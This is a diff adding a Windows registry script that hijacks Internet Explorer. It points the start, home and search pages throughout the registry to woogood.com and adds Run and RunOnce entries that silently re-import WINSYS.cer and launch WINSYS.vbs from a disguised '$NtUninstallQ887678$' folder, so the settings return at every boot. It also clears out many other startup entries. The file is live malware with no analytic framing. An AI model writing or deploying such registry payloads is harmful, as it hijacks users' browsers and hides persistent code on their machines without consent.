@@ -1,0 +1,97 @@
+REGEDIT4
+
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer]
+"SearchURL"="http://www.woogood.com/serch.htm"
+
+[HKEY_USERS\.Default\Software\Microsoft\Internet Explorer]
+"SearchURL"="http://www.woogood.com/serch.htm"
+
+[HKEY_USERS\.Default\Software\Microsoft\Internet Explorer\Main]
+"Search Page"="http://www.woogood.com/serch.htm"
+"Default_Search_URL"="http://www.woogood.com/serch.htm"
+"Search Bar"="http://www.woogood.com/serch.htm"
+
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Search]
+"SearchAssistant"="http://www.woogood.com/serch.htm"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Search]
+"SearchAssistant"="http://www.woogood.com/serch.htm"
+
+[HKEY_USERS\.Default\Software\Microsoft\Internet Explorer\Search]
+"SearchAssistant"="http://www.woogood.com/serch.htm"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main]
+"Start Page"="http://www.woogood.com"
+"First Home Page"="http://www.woogood.com"
+"Default_Search_URL"="http://www.woogood.com/serch.htm"
+"Search Page"="http://www.woogood.com/serch.htm"
+"Search Bar"="http://www.woogood.com/serch.htm"
+"Local Page"="http://www.woogood.com"
+
+[-HKEY_CURRENT_USER\Software\Microsoft\windows\CurrentVersion\Run]
+[HKEY_CURRENT_USER\Software\Microsoft\windows\CurrentVersion\Run]
+@="regedit -s C:\\$NtUninstallQ887678$\\WINSYS.cer"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main]
+"Default_Page_URL"="http://www.woogood.com"
+
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]
+"Default_Search_URL"="http://www.woogood.com/serch.htm"
+"Search Page"="http://www.woogood.com/serch.htm"
+"Search Bar"="http://www.woogood.com/serch.htm"
+"SearchURL"="http://www.woogood.com/serch.htm"
+"Start Page"="http://www.woogood.com"
+"First Home Page"="http://www.woogood.com"
+"Default_Page_URL"="http://www.woogood.com"
+"Local Page"="http://www.woogood.com"
+
+[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce]
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce]
+"WlN32"="C:\\$NtUninstallQ887678$\\WINSYS.vbs"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+"WlN32"="regedit -s C:\\$NtUninstallQ887678$\\WINSYS.cer"
+"internat.exe"="internat.exe"
+"zwupdows"=-
+"win"=-
+"mwin"=-
+"intenet"=-
+"Inernet"=-
+"Internet"=-
+"iexpleror"=-
+"zxdows"=-
+"qwe"=-
+"win1"=-
+"winwin"=-
+"9i5zxdows"=-
+"9i5com01zxdows"=-
+"99zxdows"=-
+"syste"=-
+"intelnat.exe"=-
+"88zxdows"=-
+"Start Pagewin"=-
+"Start Page"=-
+"9i5comzxdows"=-
+"9q5zxdows"=-
+"999izxdows"=-
+"033zxdows"=-
+"8zxdows"=-
+"flash"=-
+"3zxdows"=-
+"interneet.exe"=-
+"u88y"=-
+"88u88"=-
+"u18"=-
+"u1881"=-
+"u1882"=-
+"u1883"=-
+"u1884"=-
+"u1885"=-
+"u1886"=-
+"u1887"=-
+"u1888"=-
+"system"=-
+"u188"=-
+"iexpler"=-
+"u1810"=-
+"WIN32"=-
